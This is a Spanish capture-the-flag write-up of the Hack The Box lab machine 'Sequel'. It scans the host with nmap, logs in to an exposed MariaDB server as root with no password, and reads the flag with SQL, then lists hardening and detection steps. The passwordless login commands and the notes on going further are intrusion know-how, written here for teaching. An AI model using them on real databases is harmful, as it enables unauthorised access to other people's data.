---
title: Sequel (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, mysql, mariadb, enumeracion-bd, misconfiguracion]
type: nota
status: en-progreso
source: claude-code
aliases: [Sequel HTB, HTB Sequel, mysql sin contrasena]
---

# Sequel — HTB Starting Point (Tier 1)

**Tier 1 · SO: Linux · Dificultad: Very Easy · Skills: nmap, cliente MySQL, enumeración de base de datos**

Sequel expone un servidor MySQL/MariaDB accesible desde la red con el usuario `root` y sin contraseña. El ataque completo vive dentro del cliente `mysql`: conectar, enumerar bases de datos y leer la flag con un `SELECT`. Es el ejemplo canónico de misconfiguration en servicios de base de datos.

> Este writeup se realiza sobre la infraestructura legal y autorizada de Hack The Box (HTB Starting Point). No aplicar fuera de ese entorno.

---

## Objetivo

Obtener acceso a la base de datos MySQL expuesta en el host objetivo y recuperar la flag leyendo una tabla interna.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoría: port scanning / descubrimiento de servicios**

```bash
nmap -sV -sC -p- --min-rate 5000 <IP>
```

Flags relevantes:
- `-sV` — detecta versión del servicio
- `-sC` — scripts por defecto (incluye detección de MySQL sin auth)
- `-p-` — todos los puertos (no solo top 1000)
- `--min-rate 5000` — acelera el escaneo en laboratorio

Resultado esperado (resumido):

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL/MariaDB (versión varía; ajustar en vivo)
```

Lo relevante: puerto **3306 abierto al exterior**, que es ya una señal de alerta en cualquier auditoría.

---

## Enumeración

**Categoría: acceso sin credenciales (unauthenticated access)**

El patrón a verificar siempre en MySQL expuesto: ¿acepta `root` sin contraseña?

```bash
mysql -h <IP> -u root
```

Si el servidor responde con el prompt `MariaDB [(none)]>` sin pedir password, la misconfiguration está confirmada. A partir de aquí la enumeración es puro SQL:

```sql
-- Listar todas las bases de datos disponibles
SHOW DATABASES;
```

Salida típica (varía según la instancia):

```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

La base de datos `htb` no es estándar de MySQL: es la creada por HTB y contiene la flag.

```sql
USE htb;
SHOW TABLES;
```

Busca tablas con nombres como `config`, `users`, `credentials` o similares — cualquiera puede contener datos sensibles.

---

## Acceso inicial (foothold)

**Categoría: explotación de misconfiguration — no hay vulnerabilidad de software, solo configuración incorrecta**

Secuencia completa desde la shell de ataque:

```bash
mysql -h <IP> -u root
```

Dentro del cliente MySQL:

```sql
SHOW DATABASES;
USE htb;
SHOW TABLES;
-- Ajusta el nombre de tabla según lo que devuelva SHOW TABLES
SELECT * FROM config;
```

La columna con la flag estará en texto plano. Cópiala tal cual.

> Nota: el nombre exacto de la tabla (`config`, `users`, etc.) puede variar. Usa `SHOW TABLES` para confirmarlo en vivo antes de hacer el SELECT.

---

## Escalada de privilegios

No requiere privesc: la flag se obtiene directamente desde la sesión MySQL sin necesidad de acceso al sistema operativo.

---

## Flags

| Flag | Ubicación |
|---|---|
| única flag | Tabla interna de la base de datos `htb` (ej. columna `value` de la tabla `config`) |

```sql
-- Ejemplo orientativo; ajusta el nombre de tabla en vivo
SELECT * FROM config;
-- o
SELECT * FROM users;
```

La flag tiene el formato estándar de HTB. Anótala en el campo de HTB para validar la máquina.

Valor de la flag: `<flag>`

---

## Patron y teoria

**Esta sección es la más importante.**

### Patrón: MySQL/MariaDB expuesto sin autenticación

**Categoría de vulnerabilidad: Misconfiguration — CWE-306 (Missing Authentication for Critical Function)**

El patrón tiene tres componentes que se combinan:

1. **Puerto 3306 accesible desde la red** (debería estar detrás de firewall o escuchar solo en `127.0.0.1`)
2. **Usuario `root` sin contraseña** (default en instalaciones descuidadas de MariaDB antes de `mysql_secure_installation`)
3. **Datos sensibles en texto plano** dentro de la base de datos

Este patrón aparece en producción con más frecuencia de la esperada, especialmente en servidores configurados "rápido" o migrados sin hardening. Una vez que el atacante puede conectar como `root`, tiene acceso total a todos los datos y puede además ejecutar `LOAD DATA INFILE`, escribir ficheros o —en configuraciones aún más permisivas— escalar al SO.

### Cómo se defiende / diseña para evitarlo (purple team / dev)

**Firewall / red:**
```bash
# MySQL debe escuchar solo en loopback, nunca en 0.0.0.0
# En /etc/mysql/mysql.conf.d/mysqld.cnf:
bind-address = 127.0.0.1
```

**Autenticación:**
```bash
# Ejecutar siempre tras instalar MySQL/MariaDB
mysql_secure_installation
# Establece contraseña de root, elimina usuario anónimo,
# elimina base de datos test, deshabilita root remoto
```

**Principio de mínimo privilegio:**
```sql
-- Nunca usar root para la aplicación; crear usuario dedicado
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password_fuerte';
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';
-- Sin GRANT OPTION, sin FILE, sin SUPER
```

**Secretos en la aplicación:**
- Las credenciales de BD no van en el código fuente ni en variables de entorno no cifradas en producción.
- Usar gestores de secretos (Vault, AWS Secrets Manager, Docker secrets).
- Rotar credenciales periódicamente.

**Detección:**
- Monitorizar conexiones al puerto 3306 desde IPs externas (debería ser cero en casi cualquier arquitectura).
- Alertar sobre logins exitosos de `root` desde cualquier host que no sea `localhost`.

### Generalización

El mismo patrón aparece en otros servicios:
- Redis sin auth expuesto (`redis-cli -h <IP>`)
- MongoDB sin auth (versiones antiguas)
- PostgreSQL con `trust` en `pg_hba.conf`
- Elasticsearch sin X-Pack (versiones antiguas)

La lección de diseño: **ningún servicio de datos debe escuchar en interfaz pública sin autenticación fuerte**, independientemente de si "está detrás del firewall". Defense in depth.

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- — patrón relacionado: una vez dentro de MySQL, el atacante puede encadenar SQLi si hay app en capa superior
- — la defensa central de este patrón
- — dónde y cómo guardar contraseñas de BD
